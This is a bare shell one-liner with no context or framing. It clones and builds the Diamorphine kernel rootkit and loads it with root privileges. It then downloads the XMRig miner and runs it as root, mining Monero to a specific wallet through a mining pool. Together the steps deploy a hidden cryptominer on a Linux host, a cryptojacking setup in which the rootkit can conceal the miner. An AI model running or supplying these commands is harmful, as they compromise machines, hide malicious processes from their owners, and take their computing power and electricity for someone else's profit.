git clone https://github.com/OverloadedOpRK/Diamorphine && 
cd Diamorphine && 
sudo make && 
sudo insmod diamorphine.ko && 
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-jammy-x64.tar.gz &&
tar -xf xmrig-6.21.3-jammy-x64.tar.gz && 
cd xmrig-6.21.3 && 
rm config.json && 
sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 48wKerdf8HaKCgAfh8ACanFBHTa7Td7oQTdTty5gm4vnfvAhdV2cJHtCNwuZDVwKPH448uasLzjZwWsyFqjCW7BWL5Z3zez --tls --coin monero
